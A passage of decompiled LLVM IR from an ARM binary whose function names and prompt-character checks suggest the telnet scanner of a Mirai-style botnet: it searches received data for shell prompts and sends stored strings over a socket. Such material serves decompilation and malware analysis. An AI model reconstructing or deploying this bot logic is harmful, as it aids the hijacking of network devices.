  store i1 %v7_f4e0, i1* %cpsr_z.global-to-local, align 1
  %v1_f4e4 = add i32 %v0_f4e4, -1
  store i32 %v1_f4e4, i32* %r3.global-to-local, align 4
  br i1 %v7_f4e0, label %dec_label_pc_f504, label %dec_label_pc_f4ec

dec_label_pc_f4ec:                                ; preds = %dec_label_pc_f4ec.preheader, %dec_label_pc_f4e0
  %v0_f4e4 = phi i32 [ %v2_f4c4, %dec_label_pc_f4ec.preheader ], [ %v1_f4e4, %dec_label_pc_f4e0 ]
  %v0_f4ec = phi i32 [ %v1_f48c, %dec_label_pc_f4ec.preheader ], [ %v1_f4ec, %dec_label_pc_f4e0 ]
  %v1_f4ec = add i32 %v0_f4ec, -1
  store i32 %v1_f4ec, i32* %r1.global-to-local, align 4
  %v2_f4ec = icmp ne i32 %v0_f4ec, 0
  store i1 %v2_f4ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f4ec = icmp eq i32 %v0_f4ec, 1
  store i1 %v7_f4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4ec, label %dec_label_pc_ef7c.backedge.thread561, label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4ec
  %v1_f4f4 = add i32 %v0_f4e4, -2
  %v2_f4f4 = inttoptr i32 %v1_f4f4 to i8*
  %v3_f4f4 = load i8, i8* %v2_f4f4, align 1
  %v4_f4f4 = zext i8 %v3_f4f4 to i32
  store i32 %v4_f4f4, i32* %r2.global-to-local, align 4
  %v2_f4f8 = icmp ugt i8 %v3_f4f4, 61
  store i1 %v2_f4f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4f8 = icmp eq i8 %v3_f4f4, 62
  store i1 %v7_f4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4f8, label %dec_label_pc_f504, label %bb442

bb442:                                            ; preds = %dec_label_pc_f4f4
  %v3_f4fc = icmp ugt i8 %v3_f4f4, 57
  store i1 %v3_f4fc, i1* %cpsr_c.global-to-local, align 1
  %v8_f4fc = icmp eq i8 %v3_f4f4, 58
  store i1 %v8_f4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4fc, label %dec_label_pc_f504, label %dec_label_pc_f4d0

dec_label_pc_f504:                                ; preds = %dec_label_pc_f4f4, %bb442, %dec_label_pc_f4e0, %dec_label_pc_f4d8, %dec_label_pc_f4d0, %dec_label_pc_f4bc, %dec_label_pc_f498, %dec_label_pc_f4b4, %dec_label_pc_f4ac, %bb441
  %v0_f508 = phi i32 [ %v1_f48c, %dec_label_pc_f4bc ], [ %v1_f48c, %dec_label_pc_f498 ], [ %v1_f48c, %dec_label_pc_f4b4 ], [ %v1_f48c, %dec_label_pc_f4ac ], [ %v1_f48c, %bb441 ], [ %v1_f4ec, %dec_label_pc_f4d0 ], [ %v1_f4ec, %dec_label_pc_f4d8 ], [ %v1_f4ec, %dec_label_pc_f4e0 ], [ %v1_f4ec, %bb442 ], [ %v1_f4ec, %dec_label_pc_f4f4 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f508 = add i32 %v0_f508, 1
  store i32 %v1_f508, i32* @r7, align 4
  %v1_f50c = call i32 @table_unlock_val(i32 7)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f51c = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f51c, i32* %r0.global-to-local, align 4
  %v3_f520 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f520, i32* %r2.global-to-local, align 4
  store i32 %v3_f51c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f52c = load i32, i32* @r6, align 4
  %v1_f52c = add i32 %v0_f52c, 4
  %v2_f52c = inttoptr i32 %v1_f52c to i32*
  %v3_f52c = load i32, i32* %v2_f52c, align 4
  store i32 %v3_f52c, i32* %r0.global-to-local, align 4
  %v4_f530 = call i32 @__libc_send(i32 %v3_f52c, i32 %v3_f51c, i32 %v3_f520, i32 16384)
  store i32 %v4_f530, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f540 = load i32, i32* @r6, align 4
  %v1_f540 = add i32 %v0_f540, 4
  %v2_f540 = inttoptr i32 %v1_f540 to i32*
  %v3_f540 = load i32, i32* %v2_f540, align 4
  store i32 %v3_f540, i32* %r0.global-to-local, align 4
  %v4_f544 = call i32 @__libc_send(i32 %v3_f540, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f54c = call i32 @table_lock_val(i32 7)
  store i32 %v1_f54c, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f554 = load i32, i32* @r6, align 4
  %v2_f554 = add i32 %v1_f554, 12
  %v3_f554 = inttoptr i32 %v2_f554 to i32*
  store i32 6, i32* %v3_f554, align 4
  br label %dec_label_pc_f114

dec_label_pc_f5d4:                                ; preds = %dec_label_pc_eff8
  %v1_f5d4 = add i32 %v0_eff8, 24
  %v2_f5d4 = inttoptr i32 %v1_f5d4 to i32*
  %v3_f5d4 = load i32, i32* %v2_f5d4, align 4
  store i32 %v3_f5d4, i32* %r2.global-to-local, align 4
  %v1_f5d8 = add i32 %v3_f5d4, -1
  store i32 %v1_f5d8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5dc = icmp eq i32 %v1_f5d8, 0
  store i1 %v2_f5dc, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f5d8, 1
  br i1 %tmp443, label %dec_label_pc_ef7c.backedge.thread, label %dec_label_pc_f5e4

dec_label_pc_f5e4:                                ; preds = %dec_label_pc_f5d4
  %v2_f5e4 = add i32 %v1_f5d8, %v0_eff8
  store i32 %v2_f5e4, i32* %r3.global-to-local, align 4
  %v1_f5e8 = add i32 %v2_f5e4, 28
  %v2_f5e8 = inttoptr i32 %v1_f5e8 to i8*
  %v3_f5e8 = load i8, i8* %v2_f5e8, align 1
  %v4_f5e8 = zext i8 %v3_f5e8 to i32
  store i32 %v4_f5e8, i32* %r3.global-to-local, align 4
  %v2_f5ec = icmp ugt i8 %v3_f5e8, 61
  store i1 %v2_f5ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f5ec = icmp eq i8 %v3_f5e8, 62
  store i1 %v7_f5ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5ec, label %dec_label_pc_f650, label %bb444

bb444:                                            ; preds = %dec_label_pc_f5e4
  %v3_f5f0 = icmp ugt i8 %v3_f5e8, 57
  store i1 %v3_f5f0, i1* %cpsr_c.global-to-local, align 1
  %v8_f5f0 = icmp eq i8 %v3_f5e8, 58
  store i1 %v8_f5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5f0, label %dec_label_pc_f650, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %bb444
  %v2_f5f8 = icmp ugt i8 %v3_f5e8, 35
  store i1 %v2_f5f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f8 = icmp eq i8 %v3_f5e8, 36
  store i1 %v7_f5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f8, label %dec_label_pc_f650, label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %dec_label_pc_f5f8
  %v2_f600 = icmp ugt i8 %v3_f5e8, 34
  store i1 %v2_f600, i1* %cpsr_c.global-to-local, align 1
  %v7_f600 = icmp eq i8 %v3_f5e8, 35
  store i1 %v7_f600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f600, label %dec_label_pc_f650, label %dec_label_pc_f608

dec_label_pc_f608:                                ; preds = %dec_label_pc_f600
  %v2_f608 = icmp ugt i8 %v3_f5e8, 36
  store i1 %v2_f608, i1* %cpsr_c.global-to-local, align 1
  %v7_f608 = icmp eq i8 %v3_f5e8, 37
  store i1 %v7_f608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f608, label %dec_label_pc_f650, label %dec_label_pc_f638.preheader

dec_label_pc_f638.preheader:                      ; preds = %dec_label_pc_f608
  %v3_f60c = add i32 %v0_eff8, 28
  %v2_f610 = add i32 %v3_f60c, %v3_f5d4
  store i32 %v2_f610, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f638

dec_label_pc_f61c:                                ; preds = %bb445
  %v2_f61c = icmp ugt i8 %v3_f640, 35
  store i1 %v2_f61c, i1* %cpsr_c.global-to-local, align 1
  %v7_f61c = icmp eq i8 %v3_f640, 36
  store i1 %v7_f61c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f61c, label %dec_label_pc_f650, label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %dec_label_pc_f61c
  %v2_f624 = icmp ugt i8 %v3_f640, 34
  store i1 %v2_f624, i1* %cpsr_c.global-to-local, align 1
  %v7_f624 = icmp eq i8 %v3_f640, 35
  store i1 %v7_f624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f624, label %dec_label_pc_f650, label %dec_label_pc_f62c

dec_label_pc_f62c:                                ; preds = %dec_label_pc_f624
  %v2_f62c = icmp ugt i8 %v3_f640, 36
  store i1 %v2_f62c, i1* %cpsr_c.global-to-local, align 1
  %v7_f62c = icmp eq i8 %v3_f640, 37
  store i1 %v7_f62c, i1* %cpsr_z.global-to-local, align 1
  %v1_f630 = add i32 %v0_f630, -1
  store i32 %v1_f630, i32* %r3.global-to-local, align 4
  br i1 %v7_f62c, label %dec_label_pc_f650, label %dec_label_pc_f638

dec_label_pc_f638:                                ; preds = %dec_label_pc_f638.preheader, %dec_label_pc_f62c
  %v0_f630 = phi i32 [ %v2_f610, %dec_label_pc_f638.preheader ], [ %v1_f630, %dec_label_pc_f62c ]
  %v0_f638 = phi i32 [ %v1_f5d8, %dec_label_pc_f638.preheader ], [ %v1_f638, %dec_label_pc_f62c ]
  %v1_f638 = add i32 %v0_f638, -1
  store i32 %v1_f638, i32* %r1.global-to-local, align 4
  %v2_f638 = icmp ne i32 %v0_f638, 0
  store i1 %v2_f638, i1* %cpsr_c.global-to-local, align 1
  %v7_f638 = icmp eq i32 %v0_f638, 1
  store i1 %v7_f638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f638, label %dec_label_pc_ef7c.backedge.thread561, label %dec_label_pc_f640

dec_label_pc_f640:                                ; preds = %dec_label_pc_f638
  %v1_f640 = add i32 %v0_f630, -2
  %v2_f640 = inttoptr i32 %v1_f640 to i8*
  %v3_f640 = load i8, i8* %v2_f640, align 1
  %v4_f640 = zext i8 %v3_f640 to i32
  store i32 %v4_f640, i32* %r2.global-to-local, align 4
  %v2_f644 = icmp ugt i8 %v3_f640, 61
  store i1 %v2_f644, i1* %cpsr_c.global-to-local, align 1
  %v7_f644 = icmp eq i8 %v3_f640, 62
  store i1 %v7_f644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f644, label %dec_label_pc_f650, label %bb445

bb445:                                            ; preds = %dec_label_pc_f640
  %v3_f648 = icmp ugt i8 %v3_f640, 57
  store i1 %v3_f648, i1* %cpsr_c.global-to-local, align 1
  %v8_f648 = icmp eq i8 %v3_f640, 58
  store i1 %v8_f648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f648, label %dec_label_pc_f650, label %dec_label_pc_f61c

dec_label_pc_f650:                                ; preds = %dec_label_pc_f640, %bb445, %dec_label_pc_f62c, %dec_label_pc_f624, %dec_label_pc_f61c, %dec_label_pc_f608, %dec_label_pc_f5e4, %dec_label_pc_f600, %dec_label_pc_f5f8, %bb444
  %v0_f654 = phi i32 [ %v1_f5d8, %dec_label_pc_f608 ], [ %v1_f5d8, %dec_label_pc_f5e4 ], [ %v1_f5d8, %dec_label_pc_f600 ], [ %v1_f5d8, %dec_label_pc_f5f8 ], [ %v1_f5d8, %bb444 ], [ %v1_f638, %dec_label_pc_f61c ], [ %v1_f638, %dec_label_pc_f624 ], [ %v1_f638, %dec_label_pc_f62c ], [ %v1_f638, %bb445 ], [ %v1_f638, %dec_label_pc_f640 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f654 = add i32 %v0_f654, 1
  store i32 %v1_f654, i32* @r7, align 4
  %v1_f658 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f668 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f668, i32* %r0.global-to-local, align 4
  %v3_f66c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f66c, i32* %r2.global-to-local, align 4
  store i32 %v3_f668, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f678 = load i32, i32* @r6, align 4
  %v1_f678 = add i32 %v0_f678, 4
  %v2_f678 = inttoptr i32 %v1_f678 to i32*
  %v3_f678 = load i32, i32* %v2_f678, align 4
  store i32 %v3_f678, i32* %r0.global-to-local, align 4
  %v4_f67c = call i32 @__libc_send(i32 %v3_f678, i32 %v3_f668, i32 %v3_f66c, i32 16384)
  store i32 %v4_f67c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f68c = load i32, i32* @r6, align 4
  %v1_f68c = add i32 %v0_f68c, 4
  %v2_f68c = inttoptr i32 %v1_f68c to i32*
  %v3_f68c = load i32, i32* %v2_f68c, align 4
  store i32 %v3_f68c, i32* %r0.global-to-local, align 4
  %v4_f690 = call i32 @__libc_send(i32 %v3_f68c, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f698 = call i32 @table_lock_val(i32 6)
  store i32 %v1_f698, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f6a0 = load i32, i32* @r6, align 4
  %v2_f6a0 = add i32 %v1_f6a0, 12
  %v3_f6a0 = inttoptr i32 %v2_f6a0 to i32*
  store i32 8, i32* %v3_f6a0, align 4
  br label %dec_label_pc_f114

dec_label_pc_f6a8:                                ; preds = %dec_label_pc_eff8
  %v1_f6a8 = add i32 %v0_eff8, 24
  %v2_f6a8 = inttoptr i32 %v1_f6a8 to i32*
  %v3_f6a8 = load i32, i32* %v2_f6a8, align 4
  store i32 %v3_f6a8, i32* %r2.global-to-local, align 4
  %v1_f6ac = add i32 %v3_f6a8, -1
  store i32 %v1_f6ac, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6b0 = icmp eq i32 %v1_f6ac, 0
  store i1 %v2_f6b0, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f6ac, 1
  br i1 %tmp446, label %dec_label_pc_f714, label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6a8
  %v2_f6b8 = add i32 %v1_f6ac, %v0_eff8
  store i32 %v2_f6b8, i32* %r3.global-to-local, align 4
  %v1_f6bc = add i32 %v2_f6b8, 28
  %v2_f6bc = inttoptr i32 %v1_f6bc to i8*
  %v3_f6bc = load i8, i8* %v2_f6bc, align 1
  %v4_f6bc = zext i8 %v3_f6bc to i32
  store i32 %v4_f6bc, i32* %r3.global-to-local, align 4
  %v2_f6c0 = icmp ugt i8 %v3_f6bc, 61
  store i1 %v2_f6c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c0 = icmp eq i8 %v3_f6bc, 62
  store i1 %v7_f6c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6c0, label %dec_label_pc_f97c, label %bb447

bb447:                                            ; preds = %dec_label_pc_f6b8
  %v3_f6c4 = icmp ugt i8 %v3_f6bc, 57
  store i1 %v3_f6c4, i1* %cpsr_c.global-to-local, align 1
  %v8_f6c4 = icmp eq i8 %v3_f6bc, 58
  store i1 %v8_f6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6c4, label %dec_label_pc_f97c, label %dec_label_pc_f6cc

dec_label_pc_f6cc:                                ; preds = %bb447
  %v2_f6cc = icmp ugt i8 %v3_f6bc, 35
  store i1 %v2_f6cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6cc = icmp eq i8 %v3_f6bc, 36
  store i1 %v7_f6cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6cc, label %dec_label_pc_f97c, label %dec_label_pc_f6d4

dec_label_pc_f6d4:                                ; preds = %dec_label_pc_f6cc
  %v2_f6d4 = icmp ugt i8 %v3_f6bc, 34
  store i1 %v2_f6d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d4 = icmp eq i8 %v3_f6bc, 35
  store i1 %v7_f6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6d4, label %dec_label_pc_f97c, label %dec_label_pc_f70c.preheader

dec_label_pc_f70c.preheader:                      ; preds = %dec_label_pc_f6d4
  %v3_f6d8 = add i32 %v0_eff8, 28
  %v2_f6dc = add i32 %v3_f6d8, %v3_f6a8
  store i32 %v2_f6dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f70c

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f70c
  %v1_f6e8 = add i32 %v0_f704, -2
  %v2_f6e8 = inttoptr i32 %v1_f6e8 to i8*
  %v3_f6e8 = load i8, i8* %v2_f6e8, align 1
  %v4_f6e8 = zext i8 %v3_f6e8 to i32
  store i32 %v4_f6e8, i32* %r2.global-to-local, align 4
  %v2_f6ec = icmp ugt i8 %v3_f6e8, 61
  store i1 %v2_f6ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f6ec = icmp eq i8 %v3_f6e8, 62
  store i1 %v7_f6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6ec, label %dec_label_pc_f97c, label %bb448

bb448:                                            ; preds = %dec_label_pc_f6e8
  %v3_f6f0 = icmp ugt i8 %v3_f6e8, 57
  store i1 %v3_f6f0, i1* %cpsr_c.global-to-local, align 1
  %v8_f6f0 = icmp eq i8 %v3_f6e8, 58
  store i1 %v8_f6f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6f0, label %dec_label_pc_f97c, label %dec_label_pc_f6f8

dec_label_pc_f6f8:                                ; preds = %bb448
  %v2_f6f8 = icmp ugt i8 %v3_f6e8, 35
  store i1 %v2_f6f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6f8 = icmp eq i8 %v3_f6e8, 36
  store i1 %v7_f6f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6f8, label %dec_label_pc_f97c, label %dec_label_pc_f700

dec_label_pc_f700:                                ; preds = %dec_label_pc_f6f8
  %v2_f700 = icmp ugt i8 %v3_f6e8, 34
  store i1 %v2_f700, i1* %cpsr_c.global-to-local, align 1
  %v7_f700 = icmp eq i8 %v3_f6e8, 35
  store i1 %v7_f700, i1* %cpsr_z.global-to-local, align 1
  %v1_f704 = add i32 %v0_f704, -1
  store i32 %v1_f704, i32* %r3.global-to-local, align 4
  br i1 %v7_f700, label %dec_label_pc_f97c, label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f70c.preheader, %dec_label_pc_f700
  %v0_f704 = phi i32 [ %v2_f6dc, %dec_label_pc_f70c.preheader ], [ %v1_f704, %dec_label_pc_f700 ]
  %v0_f70c = phi i32 [ %v1_f6ac, %dec_label_pc_f70c.preheader ], [ %v1_f70c, %dec_label_pc_f700 ]
  %v1_f70c = add i32 %v0_f70c, -1
  store i32 %v1_f70c, i32* %r1.global-to-local, align 4
  %v2_f70c = icmp ne i32 %v0_f70c, 0
  store i1 %v2_f70c, i1* %cpsr_c.global-to-local, align 1
  %v7_f70c = icmp eq i32 %v0_f70c, 1
  store i1 %v7_f70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f70c, label %dec_label_pc_f714, label %dec_label_pc_f6e8

dec_label_pc_f714:                                ; preds = %dec_label_pc_f70c, %dec_label_pc_f6a8
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f718 = call i32 @table_unlock_val(i32 28)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_f728 = call i32 @table_retrieve_val(i32 28, i32* nonnull %stack_var_-60)
  %v3_f72c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f728, i32* %r2.global-to-local, align 4
  %v1_f734 = add i32 %v3_f72c, -1
  store i32 %v1_f734, i32* %r3.global-to-local, align 4
  %v0_f738 = load i32, i32* @sb, align 4
  store i32 %v0_f738, i32* %r0.global-to-local, align 4
  %v0_f73c = load i32, i32* @r6, align 4
  %v1_f73c = add i32 %v0_f73c, 24
  %v2_f73c = inttoptr i32 %v1_f73c to i32*
  %v3_f73c = load i32, i32* %v2_f73c, align 4
  store i32 %v3_f73c, i32* %r1.global-to-local, align 4
  %v4_f740 = call i32 @util_memsearch(i32 %v0_f738, i32 %v3_f73c, i32 %v3_f728, i32 %v1_f734)
  store i32 %v4_f740, i32* %r0.global-to-local, align 4
  %v1_f744 = add i32 %v4_f740, 1
  store i32 %v1_f744, i32* @r7, align 4
  %v2_f744 = icmp eq i32 %v4_f740, -1
  store i1 %v2_f744, i1* %cpsr_c.global-to-local, align 1
  %v7_f744 = icmp eq i32 %v1_f744, 0
  store i1 %v7_f744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f744, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f714
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f714, %bb449
  %v0_f74c = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f714 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f74c, i1* %cpsr_z.global-to-local, align 1
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_fb98 = call i32 @table_lock_val(i32 28)
  br i1 %v0_f74c, label %dec_label_pc_fb94, label %dec_label_pc_f75c

dec_label_pc_f75c:                                ; preds = %thread-pre-split124, %dec_label_pc_f97c
  %storemerge = phi i32 [ %v1_f984, %dec_label_pc_f97c ], [ %v1_fb98, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f75c = load i32, i32* @r6, align 4
  %v1_f75c = inttoptr i32 %v0_f75c to i32*
  %v2_f75c = load i32, i32* %v1_f75c, align 4
  store i32 %v2_f75c, i32* %r3.global-to-local, align 4
  %v1_f760 = add i32 %v0_f75c, 4
  %v2_f760 = inttoptr i32 %v1_f760 to i32*
  %v3_f760 = load i32, i32* %v2_f760, align 4
  store i32 %v3_f760, i32* %r0.global-to-local, align 4
  %v1_f764 = add i32 %v2_f75c, 13
  %v2_f764 = inttoptr i32 %v1_f764 to i8*
  %v3_f764 = load i8, i8* %v2_f764, align 1
  %v4_f764 = zext i8 %v3_f764 to i32
  store i32 %v4_f764, i32* %r2.global-to-local, align 4
  %v1_f768 = add i32 %v2_f75c, 4
  %v2_f768 = inttoptr i32 %v1_f768 to i32*
  %v3_f768 = load i32, i32* %v2_f768, align 4
  store i32 %v3_f768, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f770 = call i32 @__libc_send(i32 %v3_f760, i32 %v3_f768, i32 %v4_f764, i32 16384)
  store i32 %v4_f770, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f778 = load i32, i32* @r6, align 4
  %v1_f778 = add i32 %v0_f778, 4
  %v2_f778 = inttoptr i32 %v1_f778 to i32*
  %v3_f778 = load i32, i32* %v2_f778, align 4
  store i32 %v3_f778, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f784 = call i32 @__libc_send(i32 %v3_f778, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 %v4_f784, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f78c = load i32, i32* @r6, align 4
  %v2_f78c = add i32 %v1_f78c, 12
  %v3_f78c = inttoptr i32 %v2_f78c to i32*
  store i32 5, i32* %v3_f78c, align 4
  br label %dec_label_pc_f790

dec_label_pc_f790:                                ; preds = %dec_label_pc_f3a4, %bb436, %dec_label_pc_f8a0, %dec_label_pc_f9d8, %dec_label_pc_f944, %dec_label_pc_fa1c, %dec_label_pc_f75c
  %v0_f790 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f790 = icmp eq i32 %v0_f790, 0
  store i1 %v2_f790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f790, label %dec_label_pc_ef78.loopexit, label %dec_label_pc_f114

dec_label_pc_f79c:                                ; preds = %dec_label_pc_eff8
  %v1_f79c = add i32 %v0_eff8, 24
  %v2_f79c = inttoptr i32 %v1_f79c to i32*
  %v3_f79c = load i32, i32* %v2_f79c, align 4
  store i32 %v3_f79c, i32* %r2.global-to-local, align 4
  %v1_f7a0 = add i32 %v3_f79c, -1
  store i32 %v1_f7a0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7a4 = icmp eq i32 %v1_f7a0, 0
  store i1 %v2_f7a4, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f7a0, 1
  br i1 %tmp450, label %dec_label_pc_f818, label %dec_label_pc_f7ac

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f79c
  %v2_f7ac = add i32 %v1_f7a0, %v0_eff8
  store i32 %v2_f7ac, i32* %r3.global-to-local, align 4
  %v1_f7b0 = add i32 %v2_f7ac, 28
  %v2_f7b0 = inttoptr i32 %v1_f7b0 to i8*
  %v3_f7b0 = load i8, i8* %v2_f7b0, align 1
  %v4_f7b0 = zext i8 %v3_f7b0 to i32
  store i32 %v4_f7b0, i32* %r3.global-to-local, align 4
  %v2_f7b4 = icmp ugt i8 %v3_f7b0, 61
  store i1 %v2_f7b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b4 = icmp eq i8 %v3_f7b0, 62
  store i1 %v7_f7b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b4, label %dec_label_pc_f930, label %bb451

bb451:                                            ; preds = %dec_label_pc_f7ac
  %v3_f7b8 = icmp ugt i8 %v3_f7b0, 57
  store i1 %v3_f7b8, i1* %cpsr_c.global-to-local, align 1
  %v8_f7b8 = icmp eq i8 %v3_f7b0, 58
  store i1 %v8_f7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7b8, label %dec_label_pc_f930, label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %bb451
  %v2_f7c0 = icmp ugt i8 %v3_f7b0, 35
  store i1 %v2_f7c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c0 = icmp eq i8 %v3_f7b0, 36
  store i1 %v7_f7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c0, label %dec_label_pc_f930, label %dec_label_pc_f7c8

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f7c0
  %v2_f7c8 = icmp ugt i8 %v3_f7b0, 34
  store i1 %v2_f7c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c8 = icmp eq i8 %v3_f7b0, 35
  store i1 %v7_f7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c8, label %dec_label_pc_f930, label %dec_label_pc_f7d0

dec_label_pc_f7d0:                                ; preds = %dec_label_pc_f7c8
  %v2_f7d0 = icmp ugt i8 %v3_f7b0, 36
  store i1 %v2_f7d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7d0 = icmp eq i8 %v3_f7b0, 37
  store i1 %v7_f7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7d0, label %dec_label_pc_f930, label %dec_label_pc_f810.preheader

dec_label_pc_f810.preheader:                      ; preds = %dec_label_pc_f7d0
  %v3_f7d4 = add i32 %v0_eff8, 28
  %v2_f7d8 = add i32 %v3_f7d4, %v3_f79c
  store i32 %v2_f7d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f810

dec_label_pc_f7e4:                                ; preds = %dec_label_pc_f810
  %v1_f7e4 = add i32 %v0_f808, -2
  %v2_f7e4 = inttoptr i32 %v1_f7e4 to i8*
  %v3_f7e4 = load i8, i8* %v2_f7e4, align 1
  %v4_f7e4 = zext i8 %v3_f7e4 to i32
  store i32 %v4_f7e4, i32* %r2.global-to-local, align 4
  %v2_f7e8 = icmp ugt i8 %v3_f7e4, 61
  store i1 %v2_f7e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7e8 = icmp eq i8 %v3_f7e4, 62
  store i1 %v7_f7e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7e8, label %dec_label_pc_f930, label %bb452

bb452:                                            ; preds = %dec_label_pc_f7e4
  %v3_f7ec = icmp ugt i8 %v3_f7e4, 57
  store i1 %v3_f7ec, i1* %cpsr_c.global-to-local, align 1
  %v8_f7ec = icmp eq i8 %v3_f7e4, 58
  store i1 %v8_f7ec, i1* %cpsr_z.global-to-local, align 1
